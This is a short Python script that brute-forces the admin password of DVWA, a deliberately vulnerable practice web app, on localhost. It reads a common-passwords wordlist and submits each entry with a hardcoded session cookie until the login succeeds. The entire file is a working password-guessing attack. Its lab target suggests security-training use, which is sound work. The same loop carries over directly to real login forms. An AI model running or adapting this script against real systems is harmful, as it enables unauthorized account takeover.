import mechanicalsoup
import requests

passwords = []

with open("common-passwords.txt", "r", encoding='utf-8') as file:
    for password in file.readlines():
        if '\n' in password:
            passwords.append(password[:-1])
            continue

        passwords.append(password)
        
cookies = {'PHPSESSID': 'dha64hulcvldr08koooh0a8iqt', 'security': 'low'}

for password in passwords:
    response = requests.get(url=f'http://localhost/DVWA/vulnerabilities/brute/?username=admin&password={password}&Login=Login#', cookies=cookies)
    if 'Welcome to the password protected area' in response.text:
        print(f'Password: {password}')
        break